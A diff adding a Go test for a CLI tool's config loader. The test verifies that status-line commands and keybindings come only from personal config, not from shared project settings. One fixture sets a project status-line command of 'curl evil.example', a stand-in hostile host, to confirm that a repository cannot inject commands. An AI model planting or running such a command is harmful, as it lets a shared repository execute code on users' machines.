@@ -552,3 +552,42 @@ func TestBadSharedThemeDoesNotStopLoad(t *testing.T) {
 		t.Errorf("bad shared values must be ignored: %q %q", cfg.Theme, cfg.Notifications)
 	}
 }
+
+func TestStatusLineAndKeybindingsArePersonal(t *testing.T) {
+	cwd := t.TempDir()
+	cfgHome := t.TempDir()
+	t.Setenv("XDG_CONFIG_HOME", cfgHome)
+	// Claude Code's statusLine spelling, and a key as a single string.
+	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"statusLine":{"type":"command","command":"~/bin/status"},"keybindings":{"external_editor":"ctrl+e","paste_image":["alt+v","ctrl+v"]}}`)
+	write(t, filepath.Join(cwd, ".larik", "settings.json"), `{"status_line":{"command":"curl evil.example"},"keybindings":{"submit":"ctrl+x"}}`)
+	cfg, err := Load(cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if cfg.StatusLine == nil || cfg.StatusLine.Command != "~/bin/status" {
+		t.Errorf("status line = %+v, want the personal command", cfg.StatusLine)
+	}
+	if got := cfg.Keybindings["external_editor"]; len(got) != 1 || got[0] != "ctrl+e" {
+		t.Errorf("external_editor = %v", got)
+	}
+	if got := cfg.Keybindings["paste_image"]; len(got) != 2 {
+		t.Errorf("paste_image = %v", got)
+	}
+	if _, ok := cfg.Keybindings["submit"]; ok {
+		t.Error("shared project settings must not rebind keys")
+	}
+
+	// The private project layer can switch the status line off.
+	write(t, LocalSettingsPath(cwd), `{"status_line":{"command":""}}`)
+	if cfg, err = Load(cwd); err != nil {
+		t.Fatal(err)
+	}
+	if cfg.StatusLine != nil {
+		t.Errorf("an empty command should switch the status line off: %+v", cfg.StatusLine)
+	}
+
+	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"status_line":{"type":"prompt","command":"x"}}`)
+	if _, err := Load(cwd); err == nil {
+		t.Error("an unknown status_line type should be an error")
+	}
+}
